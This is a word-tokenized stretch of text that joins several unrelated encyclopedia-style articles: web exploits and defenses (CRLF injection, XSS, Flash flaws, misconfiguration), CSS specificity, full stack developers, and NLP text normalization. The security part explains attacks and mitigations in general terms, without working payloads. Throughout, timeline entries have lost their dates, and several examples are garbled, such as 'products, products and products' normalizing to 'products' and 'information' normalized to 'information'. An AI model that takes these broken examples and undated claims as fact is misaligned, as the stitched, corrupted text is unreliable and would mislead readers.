Newlines are used to separate the HTTP header from the body .
With CRLF injection , characters ` \r\n ` are forced into header fields via their URL encoded form ` % 0D%0A ` .
This can be used to modify HTTP access logs to cover up earlier attacks , enable CORS or deliver XSS payload .
To improve web security , HTTP has headers related to Cross - Origin Resource Sharing ( CORS ) .
Some of these are Access - Control - Allow - Origin , Access - Control - Expose - Headers , and Access - Control - Max - Age .
More security - specific headers include Cross - Origin - Resource - Policy , Content - Security - Policy , Strict - Transport - Security , X - Content - Type - Options , X - Frame - Options , and X - XSS - Protection .
What are some server - side web exploits ?
HTTP DoS attack works by making large number of HTTP requests to the web server .
It may also involve crawling the site to learn which pages require more server processing .
The attack then involves requesting resource - intensive pages .
If requests involve database calls , the site slows down , visibly affecting the user experience .
Another way to slow down the server is to set a high Content - Length header value , send fewer bytes and make the server wait for the rest .
Remote code execution is possible if the server is using outdated software .
Once a server is infiltrated , arbitrary code can be executed to steal data or install malware .
Insecure deserialization is a vulnerability that can lead to remote code execution .
Improper authentication and authorization can allow attackers to access protected server resources or sensitive data .
Passwords could be reset via URL query strings .
Databases could be corrupted via SQL injections .
This can happen when input data is not validated .
In any case , it 's important that server software is kept up to date .
Review and validate configuration .
Collect sufficient logs and constantly monitor them so that any breach is detected as soon as possible .
What is Cross - Site Scripting ?
Typical steps in an XSS exploit .
Source : Cloudflare 2020 .
Cross - Site Scripting ( XSS ) is when a user visits site A and her browser executes a malicious script that then contacts site B. Malicious code is contained within the ` < script > ` tag .
The user is initially tricked into clicking a link , perhaps via email .
The genuine site loads into the browser but the attacker has already passed malicious code via the URL .
Another variant of the attack is to input code in forms .
In either case , the malicious script can access user cookies on the browser .
These are sent to the attacker 's site to later impersonate the user on genuine sites she uses .
Although the JavaScript code for this attack executes on the browser , XSS attacks have been classified into Server XSS or Client XSS attacks .
In either case , the vulnerability starts with untrusted user input .
With Server XSS , the server sends the malicious script in the response .
With Client XSS , the DOM is updated to make JavaScript calls .
Context - sensitive output encoding and input validation can protect against Server XSS .
Against Client XSS , call only trusted JavaScript APIs but this is easier said than done .
What are the security problems with Flash ?
Created in 1996 by Macromedia and acquired by Adobe in 2005 , Flash is used to render rich multimedia content on browsers .
The Increasing use of Flash on the web started to grow in the early 2000s .
The earliest reported security vulnerability with Flash dates from 2005 .
As of October 2020 , Flash has gathered more than 1000 vulnerabilities .
The number of vulnerabilities are 8 ( 2019 ) , 26 ( 2018 ) and 65 ( 2017 ) .
Types of vulnerabilities include code execution , overflow , memory corruption , DoS , bypass of access restrictions , access to sensitive information , and more .
XSS attacks are possible via what 's called Flash Parameter Injection ( FPI ) .
As an example , CVE-2017 - 11292 allowed arbitrary code execution .
A flawed bytecode verification procedure meant that an array index could be derived from an untrusted value .
This led to type confusion and malicious code execution .
Flash cookies are also problematic .
They have been misused to track users across sites they visit .
Users ca n't easily disable them , unlike HTTP cookies .
Flash is not open source .
HTML5 is the standardized way to deliver multimedia content .
Due to the many security issues , browser vendors and Abode announced in 2017 that Flash would be discontinued from January 2021 .
What are some common misconfigured security settings ?
An application may have a debug mode that results in lots of internal information being printed out .
By mistake , this mode is used in production .
Even without the debug mode switched on , it 's possible that the application shows stack traces when an error occurs .
Another mistake is to allow the server to list directory contents .
This exposes internal directory structure and contents to attackers .
Software components come with default values .
For example , MySQL server uses a default username and password , unless the admin changes them to non - default values .
If an application is deployed with default values , it 's easy for an attacker to exploit this .
It 's a flaw to store passwords in the code or read them from files committed to the code repository .
A better way is to set passwords as environment variables that the application can access .
A web server offers its service on well - known default ports .
At the minimum , it may offer HTTP on port 80 and HTTPS on port 443 .
Running other services on the server , many of which may be unnecessary or unused , opens up a larger attack surface .
Could you share real - world instances of web exploits ?
Data breaches have affected many big names , including Adobe , eBay , Equifax , LinkedIn , Marriott International , Sina Weibo and Yahoo .
The biggest breach is perhaps Yahoo 's in 2013 - 14 , involving 3 billion user accounts .
eCommerce sites have been hacked .
British Airways was attacked in 2018 , leading to stolen customer details .
The problem was down to a third - party JavaScript that had not been updated since 2012 .
In 2019 , fashion retailer Sweaty Betty became victim to a malicious JavaScript injection .
The Panama Papers leak of 2016 happened due to outdated software .
In fact , the site had many vulnerabilities including authentication and SQL injection .
An example of XSS exploitation is the Steam profile hack of 2017 .
JavaScript was injected into the user profile page .
This was used to drain Steam Wallet funds or spread other malware .
Vulnerable since 2008 but discovered only in 2017 , the REST plugin of Apache Struts 2 did deserialization in an insecure manner , leading to arbitrary code execution .
Cloud infrastructure is not immune to attacks .
Australian Broadcasting Corporation and Accenture are examples of organizations that failed to adequately protect their Amazon S3 storage instance .
They were attacked in 2017 .
Could you share some best practices to make web applications more secure ?
Make your application code more secure , but this is often hard .
Instead , adopt a framework with built - in security features and functions .
Penetration testing must be part of your process .
When vulnerabilities are discovered , fix them at the earliest .
Automate processes .
Use a Web Application Firewall ( WAF ) as a preventive measure .
Design applications in a modular way so that it 's easier to apply attributes to resources .
When using third - party components , ensure you 're using the correct one and not a typosquatted package .
Keep them updated to take advantage of the latest security fixes .
Always sanitize user inputs .
Avoid blacklists since they 're brittle .
Whitelists are better .
If returning HTML tags from user input to the browser , encode the tags .
For example , return ` < script > ` as ` & amp;lt;script&amp;gt ; ` .
Do n't include user inputs in HTTP headers .
In HTTP headers , encode CRLF special characters .
Adopt security headers such as Content Security Policy and X - XSS - Protection to protect against XSS and code injection .
X - Content - Type - Options counters MIME sniffing .
X - Frame - Options counters clickjacking .
Strict - Transport - Security enforces communication over HTTPS .
For authentication , issue new cookies when a user logs in or changes role .
Limit session duration .
Set cookies with attributes HttpOnly , Secure and SameSite = Strict .
What online resources are available to know about current web vulnerabilities ?
Screenshot from Burp Suite showing SQL injection via URL query string .
Source : PortSwigger 2020d .
Software vulnerabilities are categorized and named individually to help developers and security researchers .
These are formalized as Common Vulnerabilities and Exposures ( CVE ) , a system initiated by the MITRE Corporation .
Among the useful databases are National Vulnerability Database ( NVD ) from NIST , Vulnerability Assessment Platform ( Vulners ) , Vulnerability Database ( VulDB ) and CVE Details .
Vulners offers a useful search functionality and it 's been called " Google for hackers " .
VulDB documents vulnerabilities in electronic products .
MITRE 's own database is called Common Weakness Enumeration .
MITRE and NIST work closely .
Exploits of these vulnerabilities are also documented and organized as exploit databases .
Among the well - known ones are ExploitDB , Rapid7 , CXSecurity , Vulnerability Lab , Oday , SecurityFocus , Packet Storm Security , and Google Hacking Database .
Tools are also available for security testing of web applications .
Some of these include Zed Attack Proxy ( ZAP ) from OWASP , Wfuzz , Wapiti , W3af , SQLMap , SonarQube , Iron Wasp , Metasploit , Nessus , Burp Suite , Nikto , and OpenVAS .
More tools to scan a site for vulnerabilities include SUCURI , Qualys , Quttera , Intruder , UpGuard , Web Cookies Scanner , Detectify , Probely , and Pentest - Tools .
Web technologies used by the top 500 sites .
Source : Stock et al .
2017 , fig .
2 .
In the early 1990s , the World Wide Web ( WWW ) started to grow .
Most websites serve only static pages , thus presenting few security vulnerabilities .
From the mid-1990s , more websites started to adopt JavaScript , thus presenting opportunities for the first web exploits .
As a public list of known vulnerabilities , the CVE List is launched .
The original list contains 321 entries .
By December 2000 , 29 organizations claimed to offer " CVE - compatible " products and services .
Later , the CVE List became the basis of the U.S. Government 's National Vulnerability Database ( NVD ) .
In 2011 , ITU - T adopts CVE List .
As of October 2020 , the list includes more than 140,000 entries .
Cross - Site Scripting ( XSS ) was first discovered at Microsoft .
It 's believed that XSS is due to server - side code .
By 2005 , it was clear that XSS was possible on the client side as well .
Although client - side XSS was possible even in 1997 , it started to increase in 2003 with the coming of Web 2.0 .
This exploit will continue to grow for many years and start to fall only from 2013 .
From the mid-2000s , the use of JavaScript increased in terms of key metrics : more JavaScript statements per external script that are included , inclusion of scripts from more domains , and higher code complexity .
These are indications of richer user interactions and push of application logic towards the client .
At the 26th USENIX Security Symposium Stock et al .
give the example of the Firefox browser .
It supports 83 different APIs whereas it supported only 12 APIs back in 2006 .
This growth has led to many vulnerabilities on the client side .
Edgescan Saas shows that most vulnerabilities were found in 2018 .
Source : Edgescan 2020 , pg .
8 .
Edgescan SaaS application reports that web applications pose a greater risk than applications exposed at the network layer .
About 35 % of vulnerabilities in web apps are of high or critical risk .
On average , it takes 85 days to fix a web app vulnerability .
A 20-year vulnerability in the SNMP community name is discovered .
The most common vulnerability is a birthday attack on long - duration encrypted HTTPS sessions .
Common vulnerabilities of 2019 .
Source : Positive Technologies 2020 .
A study from Positive Technologies shows that 9 out of 10 websites can be hacked , 39 % allow unauthorized access , and 68 % can suffer from data breaches .
Application codes account for 82 % of the vulnerabilities .
Security misconfigurations are the most common ones .
XSS attacks exploiting cookies that did n't use HttpOnly and Secure flags affect one out of five tested applications .
An example shows specificity calculation .
Source : Bostian 2019 .
Assume an element in a web document is targeted by two different CSS selectors .
Each selector applies different styling to that element .
The selector with the higher specificity will take effect .
CSS defines clear rules to determine the specificity of CSS selectors .
A good understanding of the rules of CSS specificity can enable developers to write better selectors and troubleshoot problems in their stylesheets .
Otherwise , developers may end up misusing them !
important ` in their CSS declarations , thus making the code more difficult to maintain in the long run .
What are the rules to determine CSS specificity ?
Template for calculating the specificity of a CSS selector .
Source : Chijioke 2019 .
A CSS selector will typically use ID , class , element / tag name or a combination of these .
In addition , some selectors will use element attributes , pseudo - classes and pseudo - elements .
Specificity is computed by counting each of these and ranking them .
IDs have more importance than classes , pseudo - classes and attributes ; the latter have more importance than elements and pseudo - elements .
Inline style , specified as attribute ` style= " … " ` , has the highest importance .
The counts are concatenated to arrive at the final specificity .
A selector with a higher number to the left implies higher specificity .
If two selectors have the same specificity , one that appears later in the stylesheet is applied .
Universal selector ` * ` and combinators ( ` ~ ` , ` > ` , ` + ` ) are ignored .
Pseudo - class ` : not ( ) ` is not counted but selectors inside it are counted .
Although specificity is calculated for selectors , styles are applied based on individual property - value declarations .
Regardless of specificity , declarations with ` !
important ` have the highest importance .
If conflicting declarations contain ` !
important ` , higher specificity wins .
If a selector has no declaration for a specific property , inherited value ( if available ) or initial value is applied .
Could you explain CSS specificity with an example ?
Given an ID , three classes and two elements , the specificity is 0 - 1 - 3 - 0 .
This has higher specificity than a selector with just five classes , where specificity is 0 - 0 - 5 - 0 .
Consider HTML content ` & lt;p class="foo " id="bar">Lorem ipsum.&lt;/p > ` .
Consider the CSS rules ` p { color : red ; } ` , ` .foo { color : green ; } ` and ` # bar { color : blue ; } ` .
All three selectors target the paragraph but the last selector has the highest specificity .
Hence , we 'll see blue - coloured text .
This can be understood by calculating the specificity : ` p ` : one element : 0 - 0 - 0 - 1 ` .foo ` : one class : 0 - 0 - 1 - 0 ` # bar ` : one ID : 0 - 1 - 0 - 0 Since 0 - 1 - 0 - 0 > 0 - 0 - 1 - 0 > 0 - 0 - 0 - 0 , ` # bar ` selector has the highest specificity .
If we have ` p { color : red !
important ; } ` , we 'll have red - coloured text .
Specificity is ignored .
Suppose we introduce inline styling , ` & lt;p class="foo " id="bar " style="color : purple"> … &lt;/p > ` .
This will take precedence , unless there 's an earlier declaration with ` !
important ` .
Suppose we have two classes ` & lt;p class="foo hoo"> … &lt;/p > ` styled with ` .hoo { color : yellow ; } ` .
Specificity is the same for both ` .foo ` and ` .hoo ` .
If ` .hoo ` appears later in the stylesheet , we 'll have yellow - coloured text .
When specificity is the same , order matters .
How is specificity affected by cascading order ?
Consider HTML content ` & lt;p class="foo " id="bar">Lorem ipsum.&lt;/p > ` .
Suppose the author defines ` .foo { color : green ; } ` and the user defines ` # bar { color : blue ; } ` .
User - defined styles are typical for accessibility reasons .
The latter has higher specificity but the former declaration is used ; that is , the text is rendered in green .
To understand this , we need to understand the concept of origin .
CSS styles can come from different origins : user ( reader of the document ) , user agent ( browser ) , or author ( web developer ) .
The standard defines the precedence of the origin .
This is applied first before specificity is considered .
The order also considers declarations that include ` !
important ` .
Precedence in descending order are Transition declarations , Important user agent declarations , Important user declarations , Important author declarations , Animation declarations , Normal author declarations , Normal user declarations , and Normal user agent declarations .
What are some examples of CSS specificity calculation ?
Examples show CSS specificity calculation .
Source : Adapted from Coyier 2018 .
Here we share a few examples : ` ul#nav li.active a ` : ` # nav ` is the ID , ` .active ` is the class , and three elements ` ul ` , ` li ` and ` a ` are used .
Specificity 0 - 1 - 1 - 3 .
` body.ie7 .col_3 h2 ~ h2 ` : Two classes ` ie7 ` and ` .col_3 ` , and three elements ` body ` , ` h2 ` and ` h2 ` are used .
` ~ ` is not counted .
Specificity 0 - 0 - 2 - 3 .
` & lt;li style="color : red ; " > ` : Has inline style attribute .
Specificity 1 - 0 - 0 - 0 .
` ul > li ul li ol li : first - letter ` : Apart from six elements , ` : first - letter ` is a pseudo - element .
` > ` is not counted .
Specificity 0 - 0 - 0 - 7 .
` li : nth - child(2):hover ` : Both ` : nth - child(2 ) ` and ` : hover ` are pseudo - classes .
Specificity 0 - 0 - 2 - 1 .
` .bar1.bar2.bar3.bar4 ` : This is a combined selector with four classes .
Specificity 0 - 0 - 4 - 0 .
What are some tips for managing CSS specificity ?
A handy CSS specificity cheatsheet .
Source : Clarke 2005 .
Use IDs to increase specificity .
For example , ` a#foo ` has higher specificity compared to ` a[id="foo " ] ` : 0 - 1 - 0 - 1 > 0 - 0 - 1 - 1 .
When two selectors have the same specificity , the selector defined second takes precedence .
The use of ` !
important ` overrides specificity .
If two declarations have ` !
important ` , the second one wins .
In any case , avoid the use of ` !
important ` .
For link styling , define CSS rules in the order of Link , Visited , Hover , Active ( LVHA ) .
In terms of online resources , developers can consult handy cheat sheets on CSS specificity at Stuff & Nonsense or at Standardista .
There 's also an online calculator .
I find CSS specificity confusing .
Is there a simpler way ?
One approach is to adopt a naming convention such as Block - Element - Modifier ( BEM ) .
By defining CSS classes for design components ( called blocks ) , the scope of a class is " limited " to that block .
In BEM , selectors use only classes .
IDs and elements are avoided in selectors .
Combined selectors ( of the form ` .foo.bar ` ) are avoided .
Nested selectors ( of the form ` .foo .bar ` ) are allowed but discouraged in BEM .
Since selectors are just classes , it 's easier to determine specificity .
Selectors can be reused more easily .
CSS Modules offer a modern way to restrict the scope of CSS declarations .
Via tooling , this automatically renames the selectors .
This can be configured to adopt the BEM naming approach .
For example , a menu component is styled with ` .Menu_item--3FNtb ` .
If it appears within a header , the style changes to ` .Header_item--1NKCj ` .
Although both have the same specificity , the latter occurs later in the stylesheet .
One alternative to BEM is Enduring CSS ( ECSS ) .
Partly inspired by BEM , ECSS promotes the use of single class selectors .
IDs and tag names are not used in selectors .
Nested selectors are allowed .
Other alternatives include Atomic CSS ( ACSS ) , Object - Oriented CSS ( OOCSS ) , Scalable and Modular Architecture for CSS ( SMACSS ) .
Is CSS specificity still relevant in modern JavaScript frameworks ?
Among the well - known JavaScript frameworks are Angular , React and Vue .
All of these offer ways to style documents in a modular fashion .
This is in contrast to the default global scope of CSS selectors and declarations .
In Angular and React , a styled component would have declarations that are applicable only to that component .
In Vue , scoped CSS achieves the same effect .
This idea of combining JS and CSS has been formalized under the term CSS - in - JS .
However , one disadvantage is that we 're combining HTML structure and styling into a component file .
Although this isolates one component from another , it also makes styles harder to reuse across components .
Although CSS declarations are restricted to their components , specificity ca n't be ignored .
Specificity still applies within the component but it is a lot easier to manage .
W3C publishes CSS1 as a W3C Recommendation .
This clarifies the precedence when conflicting rules target the same element .
It also explains how to calculate the specificity of selectors .
There 's no exact date when developers recognized the importance of CSS specificity .
Probably around 2000 ( plus or minus a few years ) , as websites and stylesheets started to grow in complexity , developers had a hard time debugging and maintaining their code .
It 's at this point that they begin to learn and understand CSS specificity .
W3C publishes the first draft of CSS2.1 , which is a revision of CSS2 from 1997 .
This clarifies the cascading order .
In descending order , it 's user important , author important , author normal , user normal and user agent declarations .
In CSS1 , precedence in descending order was author , reader and user agent declarations .
Developer Keegan Street open sources a JavaScript module that , given a selector , calculates and returns its specificity .
This is a command - line tool .
For convenience , an online version of this calculator is available .
In the W3C Working Draft titled CSS Cascading and Inheritance Level 3 , the cascading order is updated .
This document becomes a W3C Candidate Recommendation in April 2015 .
Technologies relevant to a Full Stack Developer .
Source : SoftLogic 2020 .
Any technological solution to a real - world problem consists of several IT components interacting with each other .
The entire basket of software platforms , tools , services , and even hardware or networking devices employed in the development of an IT application is called Technology Stack .
A developer whose skills cover the entire range of the technology stack , both at the client and system end , is a Full Stack Developer .
It 's more of a coinage indicating a programmer who is jack of all arts and master of one or two .
These professionals can easily understand most programming languages and can help to bring the company 's minimum viable product into the market quickly .
This is especially important for web or mobile app start - ups .
Full stack developers , due to their wider system understanding , are able to contribute better to system design in addition to development .
How did the sudden demand for full stack developers occur ?
Full Stack in start - ups .
Source : Bijeesh 2020 .
The whole narrative of full stack developer emerged from the IT start - up boom .
Earlier , large IT service companies or product MNCs were keen on specialists who knew one thing well .
These traditional roles were GUI developer , C / Java programmer , database specialist / admin , network engineer , test or automation engineer , and so on .
A typical IT application would be an integrated hierarchical solution requiring most of these skill - sets .
But in start - ups , the team is looking to build a minimum viable product that can showcase their basic idea .
This helps them seek funding and then make expansion plans .
This has to be achieved with a minimum number of developers and limited investment .
Time to market is also very short .
Hence , the need arose to recruit developers capable of programming in the entire spectrum of technologies .
A 2018 LinkedIn survey listed " Full Stack Developers " among the top 10 hard skills that developers need to possess in the IT industry .
While full stack developers are presently the trend , it does n't imply that experts are no longer vital .
As the product grows and scales , specialists are required .
What are the technologies that a full stack developer is expected to know ?
Technologies are part of full stack development .
Source : Techtic Solutions 2020 .
The skillset of full - stack developers resembles the T - model .
They have knowledge of a wide - breadth of technologies but in - depth knowledge of a couple of those .
Knowledge of at least one language / platform in each technology layer is a must .
In the web development context , popular full stack combinations include : LAMP stack : JavaScript - Linux - Apache - MySQL - PHP LEMP stack : JavaScript - Linux - Nginx - MySQL - PHP MEAN stack : JavaScript - MongoDB - Express - AngularJS - Node.js Django stack : JavaScript - Python - Django - MySQL Ruby on Rails : JavaScript - Ruby - SQLite - Rails Vendor - specific full stack expertise is also quite prevalent : Microsoft : .NET ( WPF , WCF , WF ) , Visual Studio , C # , ASP.NET/ MVC/ MVVM , REST/ Web API , Azure , GIT/ SVN , Web ( HTML5 / CSS3 / JS ) , jQuery / Typescript , Bootstrap / Angular , MS SQL Server Amazon : AWS Amplify ( Web UI ) , Amazon Cognito ( web browser ) , Amazon API gateway , AWS Lambda , Amazon DynamoDB However , developers must always remember that the technology choice is dependent on what works best for the product under design , not the other way round .
What is a company really asking for while recruiting a full - stack developer ?
Technology used in products is never static .
Companies may decide to migrate to a new version , platform or vendor that enters the market .
Therefore , there is no point in recruiting a full - stack developer with a rigid set of skills .
By asking for full stack developers , companies are actually looking for the following skills and attitude in a candidate : at least know one language or platform in each technology function - user Interface , backend processing , middleware , business logic , DB / storage , networking / communication , testing .
Self - learning ability to master a new technology quickly .
Ability to make a demonstrable product or prototype .
can independently perform debugging and customer support for applications , with quick turnaround time .
The bug could be anywhere in the system .
Work in teams and relate to the problems faced by developers working on other modules .
To understand the big picture , translate the customer requirement into a system design , which would encompass several technologies across layers .
A full stack developer will make a good tech lead or system architect .
Good at integration testing and system testing from a customer perspective .
Are there multiple types of technology stacks ?
There is no text book definition of what constitutes a technology stack .
Any hierarchy of interdependent modules built using different technologies , frameworks and languages is a technology stack .
For instance , the concept of a protocol stack has existed for decades now - OSI Layers , TCP / IP stacks and other communication / control protocols .
A mobile phone device can be an example of a hardware technology stack – body , network processor chip , peripherals , memory , battery , LCD screen all stacked one above the other .
A MEAN stack refers to a stack for building web apps and websites .
It consists of MongoDB for database storage , Express.js as the application framework , AngularJS MVC framework , and Node.js as the server - side framework .
The system design document prepared by a product development team would document the customised technology stack to be used for its own products .
Many large IT companies openly declare what technology stack is used in their development .
How to choose a technology stack for a product / application ?
Technology choices are made only in the product design phase , after the product requirements are finalised .
This involves evaluating various technology alternatives to make up the stack .
The factors considered are : Meets the requirements entirely : For example , if the requirement is to build a military application , then platforms with the highest data security and reliability are chosen .
Limited network connectivity , multi - language support , accessibility for the disabled are examples of specialised requirements that influence the choice of stack .
Scalable to support future requirement additions : Product requirements are always changing based on customer feedback .
So the technology choice must support product growth for at least 3 - 5 years .
Cost considerations : When budgets are limited , companies tend to prefer open - source options .
Or if an older project has a pre - purchased software license , the same may continue with the new one .
This is not optimal , but it happens a lot in the industry .
Skillset of the existing workforce : This goes against the idea of designing for requirements .
But very often , due to HR constraints and inability to reskill , companies decide to stick to a particular technology stack .
Can you list the technology stacks used in popular IT applications ?
Some product MNCs and start - ups swear by the efficacy of hiring full stack developers .
They openly publicise the technology stack used in their solutions , such as : Facebook : PHP , React , GraphQL , Memcached , Cassandra , Hadoop , MySQL , Swift , C++ , PHP , JavaScript , JSON , HTML , CSS .
Amazon : Java , Perl , Angular JS , MySQL , Amazon EC2 container service , DynamoDB and a host of other Amazon frameworks .
Google : Python , Java , Android SDK , Go , C++ , Preact , Angular JS , Kubernetes , TensorFlow and a host of other Google frameworks .
Dropbox : REDIS , C # , .NET , MS SQL Server StackOverflow : NGINX , Amazon , MySQL , Python Airbnb : Javascript , MySQL , Java , Ruby on Rails , Fitbit : Node .
JS , Javascript , Objective C , Java . However , many technology experts and recruiters call the idea a passing fad which breeds superficial programmers , who lack the ability to build deep expertise in anything .
Without knowing the nuances of a language , the best implementations are not possible , they claim .
One of the earliest mentions of the term " Full Stack Developer " is in a blog written by Randy Schmidt for Forge38 magazine .
It 's clearly used in the context of web development .
The first Google search for the term " Full Stack Developer " happens .
So it 's a fairly recent phenomenon .
Front - end development takes a rapid leap .
Full stack developers for web development have become a popular choice .
Earlier , web browsers were poor at interpreting a lot of JavaScript .
Adding complex functionality with JS was n't always a good idea .
As browsers become more powerful , JavaScript become versatile with extensions such as AngularJS and jQuery .
More layers have been added to the web full stack .
Source : Shora 2014 .
The number of layers in the stack is steadily increasing .
In 2010 , a full - stack developer might need to know PHP , jQuery , HTML , CSS , and FTP to transfer files to the hosting server .
Today , a full - stack developer needs a wider spectrum of skills , from modular frameworks to CSS pre - processors , from responsive UI design to cloud cluster management .
Facebook announces a new update to their technology stack .
They are rebuilding their tech stack for Facebook.com , moving beyond a simple PHP website .
Their stack includes React ( a declarative JavaScript library for building user interfaces ) and Relay ( a GraphQL client for React ) .
The position " Full stack developer " has over 14,000 listings in the US and 6,000 in India on the Indeed Job portal .
A simple example of text normalization .
Source : Geitgey 2020 .
Text normalization reduces variations in word forms to a common form when the variations mean the same thing .
For example , the US and U.S.A become USA ; products , products and products become products ; naïve becomes naive ; $ 400 becomes 400 dollars ; +7 ( 800 ) 123 1231 becomes 0078001231231 ; 25 June 2015 and 25/6/15 become 2015 - 06 - 25 ; and so on .
Before text data is used in training NLP models , it 's pre - processed to a suitable form .
Text normalization is often an essential step in text pre - processing .
Text normalization simplifies the modelling process and can improve the model 's performance .
There 's no fixed set of tasks that are part of text normalization .
Tasks depend on application requirements .
Text normalization started with text - to - speech systems and later became important for processing social media text .
What are the typical tasks within text normalization ?
We can identify the following tasks for normalizing text : Tokenization : Text is normally broken up into tokens .
A token is usually a single word , but there are exceptions , such as New York .
Lemmatization : Reduce surface forms to their root form .
For example , singing , singing and singing have a common root ' sing ' .
Stemming : Strip suffixes .
For example , trouble , troubled and trouble are stemmed from ' trouble ' .
This is a simpler and faster alternative to lemmatization .
Sentence Segmentation : Break up text into sentences using characters ` .
` , ` !
` , or ` ?
` .
Phonetic Normalization : Words spelled differently can sound the same .
Likewise , variations in pronunciation would need to be normalized to the same token .
Spelling Correction : In some applications , such as IR , it 's useful to correct spelling errors .
For example , ' information ' is normalized to ' information ' .
Non - Standard Words : This includes phone numbers , dates , currencies , addresses , acronyms , etc .
Others : Normalization may involve accents ( naïve , naive ) , UK / US spelling ( catalogue , catalog ) , and capital letters ( Product , product ) .
What are some NLP applications that benefit from text normalization ?
Information Retrieval ( IR ) is a typical example .
If the search query is ' U.S.A. ' , we may want to return results for ' U.S.A. ' and ' USA ' .
One way to do this is via query expansion in which both forms are searched .
A more efficient approach is to normalize to ' USA ' , store all documents in this normalized form and search only for ' USA ' .
Wrong normalization can produce irrelevant results , such as ' C.A.T. ' normalized to ' cat ' .
Conversational AI involves both Automatic Speech Recognition ( ASR ) and Text - to - Speech ( TTS ) synthesis .
For example , when a user says " five p m " , ASR should interpret this as " 5:00PM " .
This is called inverse text normalization .
On the reverse , a text input " 6:30PM " should be said as " six thirty p m " .
This is text normalization .
Another example is ' Dr. ' , which could be interpreted as ' Drive ' or ' Doctor ' .
Hence , context of usage is important to determine the correct normal form .
Machine translation , opinion mining , spell checking , sentiment analysis , dependency parsing , and named entity recognition are further examples of NLP tasks or applications that can benefit from text normalization .
What are some general approaches to text normalization ?
Text normalization has a few different approaches : Substitution Lists : also called wordlist mapping , lookups or memorization .
Uses a precompiled list .
Does n't generalize to variants not in the list .
Rule - based Methods : Manually crafted rules encode regularities in variants .
Distance - based Methods : Edit distance measures such as Levenshtein distance are used to determine if two word forms are similar .
Spelling Correction : Hidden Markov Models analyse word morphology and determine the correct spelling .
However , corrections are done word by word without any context .
Automatic Speech Recognition ( ASR ) : Based on the insight that microtext ( social media text , SMS messages ) is closer to sound forms rather than proper spelling .
Decodes word sequences within a weighted phonetic framework .
Machine Translation ( MT ) : Microtext is treated as a foreign language that needs to be translated .
This approach captures context .
Character - level Statistical Machine Translation ( CSMT ) maps character sequences rather than words .
It 's an example of the noisy channel model : a translation model followed by a language model .
Neural Models : Use of neural networks such as encoder - decoder model with LSTM .
What are some approaches to text tokenization ?
In English , whitespace is used to separate words .
Hence , whitespace is often used to identify tokens .
Some punctuation characters could also indicate word boundaries .
In social media text , ` :) ` and ` # nlproc ` would be considered as tokens .
Contractions are often normalized to expanded forms .
Examples , what 're → what are , I 'm → I am , is n't → is not .
This sort of normalization results in two tokens from a single word .
On the contrary , New York is an example of two words considered as a single token .
The tokenization of some words is far from unambiguous .
Hyphens present a challenge .
Should state - of - the - art become ' state of the art ' ?
Should Hewlett - Packard become ' Hewlett Packard ' ?
Should lower - case become ' lowercase ' or ' lower case ' ?
Some acronyms are also challenging .
How should we tokenize m.p.h .
and PhD ?
In Japanese and Chinese , there are no spaces to separate words .
A greedy algorithm that attempts to find the longest dictionary word is often used .
In French , should L'ensemble be tokenized as L , L ' or Le ?
In German , noun compounds are not segmented and their processing is deferred to the application .
Among the well - known tokenization approaches are Byte - Pair Encoding ( BPE ) , WordPiece and SentencePiece .
What are non - standard words that need to be normalized ?
A taxonomy of NSWs is useful for hand tagging and modelling .
Source : Sproat et al .
2001 , table 1 .
Non - Standard Words ( NSWs ) include numbers , abbreviations , dates , currency amounts and acronyms .
Mixed - case words ( WinNT , SunOS ) , Roman numerals , URLs , and email addresses are more categories of NSWs .
NSWs often occur in text apart from ordinary words and names .
The challenge with NSWs is that they 're not dictionary words and their interpretation tends to be ambiguous .
Therefore , we need to normalize them .
This basically means replacing them with ordinary words .
Take for example ' Pvt ' , which is interpreted as ' Private ' .
An ambiguous example is ' IV ' .
It could be read as four , fourth or intravenous , depending on the context .
The number 1750 could refer to a year , a building number or a cardinal number .
These differences are important for a TTS system that needs to determine the correct pronunciation .
Should Amazon Alexa read ' 2/3 ' as ' two thirds ' or ' February Third ' ?
Rather than employing ad hoc techniques to handle NSWs , formal modelling has been shown to give better results .
Techniques could include n - gram models , decision trees , and weighted finite - state transducers .
What are the challenges in normalizing social media texts ?
Possible edits to normalize social media text .
Source : Baldwin and Li 2015 , fig .
1 .
Social media texts often do n't conform to rules of spelling , grammar or punctuation .
Among its challenges are : Abbreviations : night ( night ) , gr8 ( great ) , sayin ( saying ) , lol ( laugh out loud ) , iirc ( if I remember correctly ) , hard2tell ( hard to tell ) Misspelling : wouls ( would ) , rediculous ( ridiculous ) Omitted Punctuation : i m ( I 'm ) , do nt ( do n't ) Slang : that was well mint ( that was well good ) Wordplay : that was soooooo great ( that was so great ) Disguised Vulgarities : sh1 t , fk Emoticons : :) for smiling face , & lt;3 for heart Informal Transliteration : This concerns only multilingual text .
Variations in transliteration occur due to long vowels , borrowed words , accents / dialects , double consonants , etc .
Experiments have shown that normalizing these gives better performance in machine translation and spell checking .
However , challenges remain .
Emoticons :P and ;D are treated as spelling errors .
Abbreviations ' b ' for ' be ' and ' c ' for ' see ' are not caught by spell checkers and later affect machine translation .
When " I 'm " is written as " i m " , it 's misinterpreted as an abbreviation for instant messaging .
What does it mean to normalize Unicode strings ?
Examples of Unicode normalization forms .
Source : Whistler 2020 , fig .
6 .
Consider the angstrom symbol Å that may require normalization .
Its Unicode codepoint is 212B. It can be decomposed into A followed by a small top circle .
Unicode characters can contain diacritical marks , ligatures , or half - width katakana characters .
Unicode has defined four normalization forms : Normalization Form D ( NFD ) : Canonical Decomposition Normalization Form C ( NFC ) : Canonical Decomposition , followed by Canonical Composition Normalization Form KD ( NFKD ) : Compatibility Decomposition Normalization Form KC ( NFKC ) : Compatibility Decomposition , followed by Canonical Composition Canonical equivalence means that equivalent characters or sequences of characters represent the same abstract character .
They display and behave the same way .
Compatibility equivalence is a weaker type of equivalence .
In this case , the visual appearance and behaviour may differ , though they represent the same abstract character .
For example , character ℌ becomes H and ¼ becomes 1/4 .
This difference may be acceptable in some applications .
In some cases , applications may account for these differences with additional styling .
Consider ' schön ' .
Its normal forms are ' scho\u0308n ' ( NFD & NFKD ) and ' schön ' ( NFC & NFKC ) .
Moreover , NFC and NFKC differ only in the decomposition phase .
What are some neural network approaches to text normalization ?
Text normalization with an encoder - decoder model using GRUs and attention mechanism .
Source : Zhang et al .
2019 , fig .
6 .
Since 2016 , Recurrent Neural Networks ( RNNs ) have been used for text normalization .
In particular , a few layers of BiLSTM have been used to map character sequences to word tokens .
For a long time , CSMT was the state of the art in text normalization .
Neural models generally need much larger training datasets .
To overcome this limitation , Lusetti et al .
( 2018 ) trained a character - level encoder - decoder model plus a word - level language model .
